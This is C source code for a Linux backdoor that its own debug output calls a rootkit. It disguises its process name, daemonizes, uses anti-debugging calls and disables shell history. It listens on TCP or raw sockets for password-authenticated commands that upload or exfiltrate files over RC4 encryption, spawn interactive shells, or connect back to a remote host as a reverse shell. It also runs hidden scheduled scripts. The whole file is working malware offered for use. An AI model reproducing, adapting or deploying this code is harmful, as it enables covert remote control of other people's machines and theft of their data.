//#include <stdarg.h>
#include <string.h>
#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <termios.h>
#include <netdb.h>

#include "raw.h"
#include "config.h"
#include "common.h"
#include "antidebug.h"
#include "rc4.h"

int weekday;
struct rawsock rawsocks[MAXRAWSESSIONS];
rc4_ctx rc4_crypt, rc4_decrypt;

char *envp[] = {
     "TERM=linux",
     "SHELL=/bin/sh",
     "BASH_ENV=/dev/null",
     "PS1=\\[\\033[1;30m\\][\\[\\033[0;32m\\]\\u\\[\\033[1;32m\\]@\\[\\033[0;32m\\]\\h \\[\\033[1;37m\\]\\W\\[\\033[1;30m\\]]\\[\\033[0m\\]# ",
     "HISTFILE=/dev/null",
     "HOME=" HOME,
     "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:./bin:" HOME ":" HOME "/bin",
     NULL
};

char  *argv_bash[] = {
      "bash",
//      PROCNAME,
      "--noprofile",
      "--norc",
      "-i",
      NULL
};

// TODO: Use network check method
int im_running(){
    if (0) {
        debug("I'm running!!!");
        return 1;
    }
    return 0;
}

// Cron function
#if CRON
void cron(int n) {
    char buffer[256];

    debug("Executant el cron daily\n");
    sprintf(buffer, HOME"/.daily");
    system(buffer);

    weekday++;
    if ((weekday % 7) == 0){
        debug("Executant el cron weekly\n");
        sprintf(buffer, HOME"/.weekly");
        system(buffer);
    }

    if ((weekday % 30) == 0){
        debug("Executant el cron monthly\n");
        sprintf(buffer, HOME"/.monthly");
        system(buffer);
        weekday = 0;
    }

    signal(SIGALRM, cron);
    // Launched every 24h
    alarm(60*60*24);
}
#endif

void rename_proc(char **argv, int argc) {
    int i;
    for (i = 0; i < argc; i++) {
        realloc(argv[i], strlen(PROCNAME)+1);
        memcpy(argv[i], PROCNAME, strlen(PROCNAME)+1);
    }
}

void daemonize() {
    int fd, i;
    switch (fork()) {
        case -1: exit(-1);
        case  0: break;
        default: exit(0);
    }
    setsid(); 
    chdir ("/");
    fd = open("/dev/null", O_RDWR, 0);
    dup2 (fd, 0);
    dup2 (fd, 1);
    dup2 (fd, 2);

    if (fd > 2) close(fd);

    // Ignore all signals
    for (i = 1; i < 64; i++)
        signal(i, SIG_IGN);

    //signal(SIGHUP, SIG_IGN);
    signal(SIGCHLD, sig_child);
}

void launcher_download(int sockr, int sockw, char *file, unsigned long size) {
    int bytes, fd;
    unsigned char buf[BUFSIZE];
    char *ptr;

    rc4_init((unsigned char *)KEY, sizeof(KEY), &rc4_crypt);

    ptr = strrchr(file, '/');
    if (ptr) { ptr++;}
    else { ptr = file; }

    fd = open(file, O_RDONLY);
    if (fd < 0){
        debug("Error openning file %s\n", file);
        close(sockr);
        close(sockw);
        exit(0);
    }

    bytes=0;
    while ((bytes = read(fd, buf, BUFSIZE)) > 0){
        debug("Sending %d bytes.\n", bytes);
        rc4(buf, bytes, &rc4_crypt);
        if (write(sockw, buf, bytes) < bytes){
            debug("No s'ha enviat tot!\n");
        }
    }
    debug("file %s sended!\n", file);

    sleep(1);
    close(fd);
}

int launcher_rcon(unsigned long ip, unsigned short port) {
    int sock;
    struct sockaddr_in cli;

    sock = socket(AF_INET, SOCK_STREAM, 6);
    if (sock < 0) exit(-1);

    memset(&cli, 0, sizeof(cli));
    cli.sin_family = AF_INET;
    cli.sin_port = htons(port);
    cli.sin_addr.s_addr = ip;

    if (connect(sock, (struct sockaddr *) &cli, sizeof(cli)) < 0) {
        close(sock);
        debug("Failed to connect to destination port %d\n", port);
        exit(-1);
    }

    return sock;
}

void launcher_upload(int sockr, int sockw, char *file, unsigned long size) {
    int fd, bytes;
    unsigned char buf[BUFSIZE];
    char *ptr;
    char file_path[256];
    struct timeval tv;
    int nfd = 0;

    rc4_init((unsigned char *)KEY, sizeof(KEY), &rc4_decrypt);

	// Timeout
	tv.tv_sec=15;
	tv.tv_usec=0;

    ptr = strrchr(file, '/');
    if (ptr) { ptr++;}
    else { ptr = file; }

    if (getuid()) sprintf(file_path,"/var/tmp/%s", ptr);
    else sprintf(file_path, "%s/%s", HOME, ptr);
    fd = open(file_path, O_RDWR|O_CREAT|O_TRUNC, S_IRWXU);
    if (fd < 0){
        debug("Error creating file: %s",file_path);
        close(sockr);
        close(sockw);
        exit(0);
    }
    debug("file %s created!\n", file_path);
    
    bytes=0;

    while (1) {
        fd_set  fds;
        FD_ZERO(&fds);
        FD_SET(sockr, &fds);

        nfd = select(sockr + 1, &fds, NULL, NULL, &tv);
        if (nfd == 0) break;
        else if (nfd > 0 && FD_ISSET(sockr, &fds)) {
            if ((bytes = read(sockr, buf, BUFSIZE)) <= 0 && (errno != EINTR)) {
                break;
            } else {
                errno = 0;
                debug("Received %d bytes.\n", bytes);
                rc4(buf, bytes, &rc4_decrypt);
                if (write(fd, buf, bytes) < bytes){
                    debug("No s'ha guardat tot!\n");
                }
            } 
        }
    }

    sleep(1);
    close(fd);
}

void launcher_shell(int sockr, int sockw) {
    int tty, pty, subshell;
    unsigned char buf[BUFSIZE];
    // used to get the tty
    extern char *ptsname();
	unsigned char echar = (unsigned char)ECHAR;

    rc4_init((unsigned char *)KEY, sizeof(KEY), &rc4_crypt);
    rc4_init((unsigned char *)KEY, sizeof(KEY), &rc4_decrypt);

    pty = open("/dev/ptmx", O_RDWR);
    grantpt(pty);
    unlockpt(pty);
    tty = open(ptsname(pty), O_RDWR);

    // child
    if(!(subshell = fork())) {
        // per a que bash sigui fill de l'init
        if (fork() != 0){
            exit(0);
        }

        close(pty);
        close(sockr);
        close(sockw);
        // new session to be used with bash
        setsid();
        ioctl(tty, TIOCSCTTY, NULL);

        // start using the new tty
        dup2(tty, 0);
        dup2(tty, 1);
        dup2(tty, 2);
        close(tty);

        if (getuid()) chdir("/var/tmp");
        else chdir(HOME);
        
        execve("/bin/bash", argv_bash, envp);
        execve("/usr/local/bin/bash", argv_bash, envp);
        execl("/bin/ksh", "ksh", "-i", NULL);
        execl("/usr/local/bin/ksh", "ksh", "-i", NULL);
        execl("/usr/local/bin/csh", "csh", "-i", NULL);

        // we should not to be here
        exit(1);
    }

    // parent
    else{
        close(tty);
        //per a que la conexio establerta amb el tty sigui fill de l'init
        if (fork() != 0) exit(0);

        // main while
        while (1) {
            fd_set  fds;
            int count;
            unsigned char *p;

            // put the fd to watch
            FD_ZERO(&fds);
            FD_SET(sockr, &fds);
            FD_SET(pty, &fds);

            if (select(max(pty, sockr)  + 1, &fds, NULL, NULL, NULL) < 0 && (errno != EINTR)) break;

            /* shell => client */
            if (FD_ISSET(pty, &fds)) {
                count = read(pty, buf, BUFSIZE);
                if ((count <= 0) && (errno != EINTR)) break;
                rc4(buf, count, &rc4_crypt);
                if (write(sockw, buf, count) <= 0 && (errno != EINTR)) break;    
            /* client => shell */
            } else if (FD_ISSET(sockr, &fds)) {
                count = read(sockr, buf, BUFSIZE);
                if ((count <= 0) && (errno != EINTR)) break;
                rc4(buf, count, &rc4_decrypt);
                if ((p = memchr(buf, ECHAR, count))){
                    debug("Received special char\n");
					if (count == 1) break;
					else if (count == 5) {
                    	struct  winsize ws;
                    	int t;

                    	ws.ws_xpixel = ws.ws_ypixel = 0;
                    	ws.ws_col = (p[1] << 8) + p[2];
                    	ws.ws_row = (p[3] << 8) + p[4];
                    	if (ws.ws_col & ws.ws_row) {
                    	    ioctl(pty, TIOCSWINSZ, &ws);
                    	    kill(0, SIGWINCH);
                    	}
                    	// Write the other data
                    	write(pty, buf, p-buf);
                    	t = (buf+count) - (p+5);
                    	if (t > 0) write(pty, p+5, t);
					}
                } 
                else if (write(pty, buf, count) <= 0 && (errno != EINTR)) break;
            }
        }
    }   
					
	// stop the client
	debug("Stopping client\n");
    rc4(&echar, 1, &rc4_crypt);
	write(sockw, &echar, 1); 
	sleep(1);            
    rc4(&echar, 1, &rc4_crypt);
	write(sockw, &echar, 1); 
    close(pty);
    debug("Waiting child\n");
    waitpid(subshell, NULL, 0);
}

void do_action(struct data *d, struct in_addr *ip, short sport,  int sock) {
    struct rawsock *r;
    antidebug3();
    switch(d->action) {
        case UPLOAD:
            antidebug3();
            debug("Uploading file\n");
            if (!getuid()) {
                debug("Can not transfer files using direct RAW\n");
                r = create_rawsock_session(rawsocks, ip->s_addr, sport, d->port);
    			if (fork()) return;
                launcher_upload(r->r[0], r->w[1], (char *)d->bytes, d->size);
            } else {
    			if (fork()) return;
                launcher_upload(sock, sock, (char *)d->bytes, d->size);
                close(sock);
            }
            break;
        case DOWNLOAD:
            debug("Downloading file\n");
            if (!getuid()) {
                debug("Can not transfer files using direct RAW\n");
                r = create_rawsock_session(rawsocks, ip->s_addr, sport, d->port);
    			if (fork()) return;
                launcher_download(r->r[0], r->w[1], (char *)d->bytes, d->size);
				stop_rawsock_partner(r, (unsigned char *)SERVERAUTH);
				destroy_rawsock_session(r);
            } else {
    			if (fork()) return;
                launcher_download(sock, sock, (char *)d->bytes, d->size);
                close(sock);
                antidebug3();
            }
            break;
        case SHELL:
            debug("Launching shell\n");
            if (!getuid()) {
                debug("Starting DirectRAW service\n");
                r = create_rawsock_session(rawsocks, ip->s_addr, sport, d->port);
    			if (fork()) return;
                launcher_shell(r->r[0], r->w[1]);
				destroy_rawsock_session(r);
                antidebug3();
            } else {
    			if (fork()) return;
                launcher_shell(sock, sock);
                close(sock);
            }
            break;
        case REVUPLOAD:
    		if (fork()) return;
            debug("Reverse uploading file\n");
            if ((sock = launcher_rcon(ip->s_addr, d->port))) {
                launcher_upload(sock, sock, (char *)d->bytes, d->size);
                close(sock);
            }
            break;
        case REVDOWNLOAD:
    		if (fork()) return;
            debug("Reverse downloading file\n");
            if ((sock = launcher_rcon(ip->s_addr, d->port))) {
                launcher_download(sock, sock, (char *)d->bytes, d->size);
                close(sock);
            }
            break;
        case REVSHELL:
    		if (fork()) return;
            antidebug3();
            debug("Launching reverse shell\n");
            if ((sock = launcher_rcon(ip->s_addr, d->port))) {
                launcher_shell(sock, sock);
                close(sock);
            }
            break;
        case RAWSESSION:
            debug("Raw session packet\n");
            r = find_rawsock_session(rawsocks, ip->s_addr, sport, d->port);
            fill_rawsock_session(r, d->bytes, d->size);
            return;
            break;
        case STOPRAWSESSION:
            debug("Client destroyed the rawsocksession\n");
            antidebug3();
            r = find_rawsock_session(rawsocks, ip->s_addr, sport, d->port);
			destroy_rawsock_session(r);	
            return;
            break;
        default:
            debug("Invalid option: %d\n", d->action);
            return;
    }
    debug("Connection closed\n");
    exit(0);
}

void tcp_daemon(int port) {
    int sock, sock_con, one = 1, bytes;
    struct sockaddr_in tcp;
    struct sockaddr_in cli;
    unsigned int slen = sizeof(cli);
    struct data d;

    if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
        debug("Can't allocate tcp socket\n");
        exit(-1);
    }

    antidebug3();
    memset((char *) &tcp, 0, sizeof(tcp));
    tcp.sin_family = AF_INET;
    tcp.sin_addr.s_addr = htonl(INADDR_ANY);
    tcp.sin_port = htons(port);

    // We want to reuse the source port port (avoiding bind errors)
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char *)&one, sizeof(int)) < 0)
        debug("Error setsockopt: reuseaddr\n");

    if (bind(sock, (struct sockaddr *) &tcp, sizeof(tcp)) < 0) {
        debug("Error: bind\n");
        exit(-1);
    }

    if (listen(sock, 1) < 0) {
        debug("Error: listen\n");
        exit(-1);
    }

    debug("Listening to port %d\n", port);
    while (1) {
        sock_con = accept(sock, (struct sockaddr *) &cli, &slen);
        if (sock_con < 0) {
            debug("Error: accept\n");
            exit(-1);
        }
        printf("Received connection!\n");
        if (!fork()) {
            close(sock);
            if ((bytes = read(sock_con, &d, sizeof(struct data))) != sizeof(struct data)) {
                debug("ERROR: tcp_daemon. Llegits %d bytes\n", bytes);
            }
            if (!memcmp(CLIENTAUTH, d.pass, 20)) {
                debug("S'ha rebut el paquet d'autenticacio correctament (action: %d)\n", d.action);
                do_action(&d, &tcp.sin_addr, 0, sock_con);
            }
            exit(-1);
        }
        close(sock_con);
    }
}


void raw_daemon() {
    int sock;
    struct sockaddr_in raw;
    unsigned int slen = sizeof(raw);
    struct packet p;
    int size;
    
    //with this type, we will not appear on neststat, but we receive the layer 2 headers
    //sock = socket(AF_INET, SOCK_RAW, 768);
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        debug("Can't allocate raw socket\n");
        exit(-1);
    }

    antidebug3();

    while (1) {
        size = recvfrom(sock, &p, sizeof(p), 0, (struct sockaddr *) &raw, &slen);
        // Si el tamany del paquet es el que toca
        if (size == sizeof(struct packet)) {
            // I el password és correcte
            if (!memcmp(CLIENTAUTH, p.action.pass, 20)) {
                debug("S'ha rebut el paquet d'autenticat (action: %d)\n", p.action.action);
                do_action(&(p.action), &raw.sin_addr, ntohs(p.tcp.dest), 0);
            }
        }
    }
}

int main(int argc, char **argv) {
    antidebug4(argv[0]);
    int port = 0;

    antidebug3();

    // Command mode
    if (argc == 3){
        unsigned short port = atoi(argv[2]);
        unsigned long ip;
        char ipname[64];
        int sock;
        debug("Iniciant reverse tty\n");
        ip = resolve(argv[1], ipname);
        if (ip == INADDR_NONE) {
            perror(argv[1]);
            return 1;
        }

        debug("Connecting to %s:%d\n",ipname,port);
        if ((sock = launcher_rcon(ip, port))) {
            launcher_shell(sock, sock);
            close(sock);
        }
 
        return 0;
    } else if (argc == 2) {
        port = atoi(argv[1]);    
    }

    // Check if we are running


    // Change proc name
    rename_proc(argv, argc);

    // Daemonize
#if ! DEBUG
    antidebug1();
    daemonize();
#else
    signal(SIGCHLD, sig_child);
#endif

    // Cron
#if CROND
    debug("Initializing crond\n");
    signal(SIGALRM, cron);
    alarm(60*60*24);
#endif

#ifdef KEYLOGGER
    debug("Initializing keylogger\n");
#endif

    // if we can't open a raw socket
    if (getuid() && geteuid()) {
        if (port) {
            debug("Detected unprivileged mode, openning TCP socket\n");
            // Open a socket and listen

            tcp_daemon(port);
        }
    } else {
        debug("Detected privileged mode, openning RAW socket\n");
        // Change to root mode
        setuid(0);
        setreuid(0,0);
        setgid(0);
        setregid(0,0);

        // Open a socket and listen
        raw_daemon();
    }

    debug("Finalising rootkit\n");

    return 0;   
}
